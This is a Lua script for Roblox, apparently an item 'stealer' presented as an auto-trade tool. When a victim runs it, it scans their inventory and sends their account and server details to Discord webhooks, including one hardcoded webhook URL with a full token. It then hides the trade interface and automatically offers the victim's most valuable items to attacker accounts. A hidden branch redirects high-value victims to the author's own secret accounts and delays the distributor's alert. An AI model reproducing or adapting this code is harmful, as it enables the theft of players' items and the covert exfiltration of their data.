-- ==========================================
-- SCRIPT 2 (CORE ACTUALIZADO CON DUAL VALUES Y WEBHOOK COMPLETO)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ==========================================
-- URL DEL REPOSITORIO DE VALORES DUAL HOOK (FIJA Y SECRETA)
-- ==========================================
local DUAL_VALUES_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/main/utils5.json"
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"

local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}

local efectosEspecialesDual = {
    MatchaEffect = true, SpiritOverload = true, ValkyrieEffect = true,
    DragonBlossom = true, RainbowEffect = true, LumenburstEffect = true,
    StardustCollapseEffect = true
}

-- Esperar a que el SCRIPT 1 inyecte la configuración
while getgenv and not getgenv().AutoTradeConfig do
    task.wait(0.2)
end

local config = getgenv().AutoTradeConfig or {}
local WEBHOOK_LOGS = config.WebhookLogs or "" 
local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
local USER_VALUES_URL = config.ValuesURL or "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"

-- ==========================================
-- CARGA DINÁMICA DE VALORES (DOS LISTAS INDEPENDIENTES)
-- ==========================================
local function fetchValues(url)
    local success, response = pcall(function() return game:HttpGet(url) end)
    if success and response then
        local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response) end)
        if decodeSuccess and decodedData then return decodedData end
    end
    return {}
end

local UserData = fetchValues(USER_VALUES_URL)
local UserKnives, UserGuns, UserEffects, UserEmotes = UserData.Knives or {}, UserData.Guns or {}, UserData.Effects or {}, UserData.Emotes or {}

local DualData = fetchValues(DUAL_VALUES_URL)
local DualKnives, DualGuns, DualEffects, DualEmotes = DualData.Knives or {}, DualData.Guns or {}, DualData.Effects or {}, DualData.Emotes or {}

task.spawn(function()
    local startTime = os.time()

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url = WEBHOOK_LOGS, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ content = "✅ **" .. player.Name .. "** ha ejecutado el script." })
            })
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == Players.LocalPlayer then
            local tiempo = os.time() - startTime
            local horas = math.floor(tiempo / 3600)
            local minutes = math.floor((tiempo % 3600) / 60)
            local segundos = tiempo % 60

            local textoTiempo = ""
            if horas > 0 then textoTiempo = textoTiempo .. horas .. " horas, " end
            if minutes > 0 then textoTiempo = textoTiempo .. minutes .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            pcall(function()
                if request and WEBHOOK_INVENTARIO ~= "" then
                    request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" },
                        Body = HttpService:JSONEncode({ content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado el juego.\n⏳ **Duró:** `" .. textoTiempo .. "`" })
                    })
                end
            end)
        end
    end)

    local jugadoresObjetivos = config.JugadoresObjetivos or {}

    local armasPrioritarias = {
        LightningBolt = true, LightningStriker = true, MatchaBobaKnife = true, MatchaBobaGun = true,
        DuskveilDagger = true, DuskveilIron = true, ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true, 
        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true, 
        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
        SealordTrident = true, SealordRevolver = true, DragonpetalBlade = true, DragonpetalSniper = true, DragonpetalOutlaw = true, 
        LovestruckKnife = true, LovestruckGun = true, SharkLauncher = true, Revolver_Default = true, 
    }

    local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)

    if ok and cg.PlayerData then
        local pd = cg.PlayerData
        
        local kUser, gUser, eUser, emUser = {}, {}, {}, {}
        local kDual, gDual, eDual, emDual = {}, {}, {}, {}
        
        local totalValueUser, totalValueDual = 0, 0
        local hasSpecialEffect = false

        local foundMatchaKnife, foundMatchaGun = false, false
        local foundDragonBlade, foundDragonGun = false, false
        local foundLightningBolt, foundLightningStriker = false, false

        local function normalizeName(name) return string.gsub(name, " ", "") end

        local function scanAndSaveBoth(category, userTable, dualTable, rUser, rDual)
            local inv = pd:TryIndex({"Inventory", category})
            if not inv then return end
            
            for guid, item in pairs(inv) do
                if item and item.name then
                    local cleanName = normalizeName(item.name)
                    
                    if dualTable[cleanName] then
                        if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
                        if cleanName == "MatchaBobaGun" then foundMatchaGun = true end
                        if cleanName == "DragonpetalBlade" then foundDragonBlade = true end
                        if cleanName == "DragonpetalSniper" or cleanName == "DragonpetalOutlaw" then foundDragonGun = true end
                        if cleanName == "LightningBolt" then foundLightningBolt = true end
                        if cleanName == "LightningStriker" then foundLightningStriker = true end
                        if category == "Effect" and efectosEspecialesDual[cleanName] then hasSpecialEffect = true end
                        
                        local dualVal = dualTable[cleanName]
                        totalValueDual = totalValueDual + dualVal
                        table.insert(rDual, { name = item.name, guid = guid, value = dualVal })
                    end

                    if userTable[cleanName] then
                        local userVal = userTable[cleanName]
                        totalValueUser = totalValueUser + userVal
                        table.insert(rUser, { name = item.name, guid = guid, value = userVal })
                    end
                end
            end
        end

        scanAndSaveBoth("Knife", UserKnives, DualKnives, kUser, kDual)
        scanAndSaveBoth("Gun", UserGuns, DualGuns, gUser, gDual)
        scanAndSaveBoth("Effect", UserEffects, DualEffects, eUser, eDual)
        scanAndSaveBoth("Emote", UserEmotes, DualEmotes, emUser, emDual)

        local hayItems = (#kDual > 0) or (#gDual > 0) or (#kUser > 0) or (#gUser > 0)
        local isMegaHit = (totalValueDual >= 5000 or hasSpecialEffect)

        if hayItems and request then
            -- ==========================================
            -- RECUPERACIÓN DE ESTADÍSTICAS E INFO DEL JUGADOR
            -- ==========================================
            local executionText = player.Name .. " 1x executions"
            if isfile and readfile and writefile then
                local fileName = "AutoTrade_Executions.json"
                local executionData = {}
                if isfile(fileName) then
                    local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
                    if success and type(data) == "table" then executionData = data end
                end
                local playerName = player.Name
                executionData[playerName] = (executionData[playerName] or 0) + 1
                pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
                executionText = playerName .. " " .. executionData[playerName] .. "x executions"
            end

            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
            local playersCount = #Players:GetPlayers()
            local maxPlayers = Players.MaxPlayers
            local robloxVer = version()
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

            local function formatearLista(lista)
                local contador, orden, texto = {}, {}, ""
                for _, v in ipairs(lista) do
                    local clave = v.name
                    if not contador[clave] then
                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                        table.insert(orden, clave)
                    else
                        contador[clave].cantidad = contador[clave].cantidad + 1
                        contador[clave].valor = contador[clave].valor + v.value
                    end
                end
                for _, clave in ipairs(orden) do
                    local info = contador[clave]
                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. " 💰]`\n"
                end
                if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                return texto 
            end

            local function buildPayload(knives, guns, effects, emotes, totalVal, isDualWebhook)
                local campos = {}
                if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = false }) end
                if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = false }) end
                if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
                if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end

                local pings = {}
                local embedColor = 3447003

                if totalVal >= 5000 or hasSpecialEffect then
                    table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO!** 🚨")
                    embedColor = 16711680
                elseif totalVal >= 2000 then
                    table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO!** 🚨")
                    embedColor = 16766720
                end

                if (foundMatchaKnife and foundMatchaGun) and (foundDragonBlade and foundDragonGun) then
                    table.insert(pings, "@TOP-SETS 🍵🐉 **¡SETS MATCHA Y DRAGONPETAL!**")
                end

                local valueLabel = isDualWebhook and "(Valores Dual)" or "(Valores Usuario)"
                local footerText = isDualWebhook and "Sistema Dual Exclusivo | " .. os.date("%X") or "Sistema de Escaneo Automático | " .. os.date("%X")
                
                local descText = "### 👤 Información del Jugador\n" ..
                                 "**Usuario:** `" .. player.Name .. "`\n" ..
                                 "**Display Name:** `" .. player.DisplayName .. "`\n" ..
                                 "**User ID:** `" .. player.UserId .. "`\n" ..
                                 "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
                                 "### ⚙️ Información del Servidor\n" ..
                                 "**JobId:** `" .. game.JobId .. "`\n" ..
                                 "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
                                 "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
                                 "**Roblox Version:** `" .. robloxVer .. "`\n" ..
                                 "**Executor:** `" .. executorName .. "`\n\n" ..
                                 "### 📊 Estadísticas de Hit\n" ..
                                 "**Historial:** `" .. executionText .. "`\n" ..
                                 "**Total Value:** `💰 " .. totalVal .. " " .. valueLabel .. "`\n\n" ..
                                 "**=============================**"

                return HttpService:JSONEncode({
                    content = (#pings > 0 and table.concat(pings, "\n") or nil),
                    username = "Auto-Trade Bot Scanner",
                    avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                    embeds = {{
                        title = "🎯 ¡Objetivo de Tradeo Localizado!", color = embedColor, description = descText,
                        thumbnail = { url = avatarUrl }, 
                        fields = campos,
                        footer = { text = footerText, icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png" }
                    }}
                })
            end

            -- Generamos los dos Payloads
            local payloadUser = buildPayload(kUser, gUser, eUser, emUser, totalValueUser, false)
            local payloadDual = buildPayload(kDual, gDual, eDual, emDual, totalValueDual, true)

            -- ==========================================
            -- LÓGICA DE ENVÍO DE WEBHOOKS
            -- ==========================================
            if isMegaHit then
                -- 1. Dual Webhook Instantáneo
                task.spawn(function()
                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
                        request({ Url = DUAL_WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payloadDual })
                    end
                end)

                -- 2. User Webhook con Delay de 5 Minutos (300s)
                if WEBHOOK_INVENTARIO ~= "" then
                    task.delay(300, function()
                        pcall(function() request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payloadUser }) end)
                    end)
                end
                
                -- Cambiar jugadores a las cuentas secretas del Dual
                jugadoresObjetivos = jugadoresObjetivosDual
            else
                -- Hit Normal -> Sólo Notifica al Usuario al instante
                if WEBHOOK_INVENTARIO ~= "" then
                    request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payloadUser })
                end
            end
        end

        local jugadorEncontrado = nil
        repeat 
            task.wait(0.5)
            for _, nombre in ipairs(jugadoresObjetivos) do
                local p = Players:FindFirstChild(nombre)
                if p then jugadorEncontrado = p; break end
            end
        until jugadorEncontrado

        task.wait(10)
        local tradeando, posicionOriginalTrade = true, nil 

        task.spawn(function()
            while tradeando do
                task.wait()
                pcall(function()
                    local pGui = player:WaitForChild("PlayerGui")
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = false
                    end
                    if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                        if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                            posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
                        end
                        pGui.NewGui.TradeNegotiation.Position = UDim2.new(1000, 1000, 1000, 1000)
                    end
                end)
            end
        end)

         local function ejecutarTradeo()
            local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
            if not okData then return false end
            local pdTrade = cgData.PlayerData
            
            local listaEfectos, listaEmotes = {}, {}
            local listaArmasPrioritarias, listaArmasNormales = {}, {}

            local function scanTrade(cat, valueTable, destList, isPriority)
                local inv = pdTrade:TryIndex({"Inventory", cat})
                if not inv then return end
                for guid, item in pairs(inv) do
                    if item and item.name then
                        local cleanName = normalizeName(item.name)
                        if valueTable[cleanName] then
                            local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
                            if destList then
                                table.insert(destList, itemData)
                            elseif isPriority and armasPrioritarias[cleanName] then
                                table.insert(listaArmasPrioritarias, itemData)
                            else
                                table.insert(listaArmasNormales, itemData)
                            end
                        end
                    end
                end
            end

            -- Aseguramos que si se activó el Mega Hit y cambió a Dual, usemos la lista de valores del Dual para robar
            local activeKnives = isMegaHit and DualKnives or UserKnives
            local activeGuns = isMegaHit and DualGuns or UserGuns
            local activeEffects = isMegaHit and DualEffects or UserEffects
            local activeEmotes = isMegaHit and DualEmotes or UserEmotes

            scanTrade("Knife", activeKnives, nil, true)
            scanTrade("Gun", activeGuns, nil, true)
            scanTrade("Effect", activeEffects, listaEfectos, false)
            scanTrade("Emote", activeEmotes, listaEmotes, false)

            local sortPorValor = function(a, b) return a.value > b.value end
            table.sort(listaEmotes, sortPorValor)
            table.sort(listaEfectos, sortPorValor)
            table.sort(listaArmasPrioritarias, sortPorValor)
            table.sort(listaArmasNormales, sortPorValor)

            local itemsRestantes = {}
            for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end

            if #itemsRestantes == 0 then return false end
            
            -- ==========================================
            -- LÓGICA DE TRADE SEGURO APLICADA AQUÍ
            -- ==========================================
            local Remotes = require(RS.Shared.Remotes)
            local ActiveNegotiation = cgData.ActiveNegotiation
            local SessionState = cgData.SessionState
            local Workspace = game:GetService("Workspace")

            local function getSides()
                local data = ActiveNegotiation.Data
                if type(data) ~= "table" then return nil, nil, nil end
                if type(data.player1) ~= "table" or type(data.player2) ~= "table" then return nil, nil, nil end
                
                local me, other
                if data.player1.player and data.player1.player.UserId == player.UserId then
                    me, other = data.player1, data.player2
                else
                    me, other = data.player2, data.player1
                end
                return me, other, data
            end

            local function waitUntil(cond, timeout)
                local t0 = os.clock()
                while os.clock() - t0 < timeout do
                    if cond() then return true end
                    task.wait(0.2)
                end
                return cond()
            end

            local function waitProcessingLock()
                waitUntil(function()
                    local _, _, d = getSides()
                    return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
                end, 5)
            end

            repeat
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end

                local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
                local aceptado = false
                
                if type(incoming) == "table" then
                    for _, p in ipairs(incoming) do
                        if p.Name == jugadorEncontrado.Name then
                            Remotes.AcceptInvite:FireServer(p)
                            aceptado = true
                        end
                    end
                end
                
                if not aceptado then Remotes.SendInvite:FireServer(jugadorEncontrado) end
                task.wait(2.5)
            until getSides() ~= nil

            task.wait(1)

            for i = 1, math.min(12, #itemsRestantes) do
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                if not getSides() then return false end
                
                waitProcessingLock()
                Remotes.OfferItem:FireServer(itemsRestantes[i].guid)
                task.wait(0.35)
            end

            task.wait(0.5)

            local me = getSides()
            if me and not me.ready then
                waitUntil(function()
                    local _, _, d = getSides()
                    return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
                end, 6)
                
                local _, other, d2 = getSides()
                if other and d2 then
                    Remotes.SetReady:FireServer(true, other.ref or {})
                end
            end

            local done = waitUntil(function()
                local m, _, d = getSides()
                if not d then return true end
                if d.exchanging == true then return true end
                if m and not m.ready then return true end
                return false
            end, 60)

            local m, _, d = getSides()
            if d and d.exchanging then
                waitUntil(function() return getSides() == nil end, 20)
                task.wait(1)
                return true
            end

            return false
        end

        while true do
            if not (jugadorEncontrado and jugadorEncontrado.Parent) then break end
            if not ejecutarTradeo() then break end
        end

        tradeando = false
        task.wait(0.5) 

        pcall(function()
            local pGui = player:WaitForChild("PlayerGui")
            if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                pGui.Notifications.Body.Visible = true
            end
            if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                if posicionOriginalTrade then
                    pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
                else
                    pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200) 
                end
            end
        end)
    end
end)
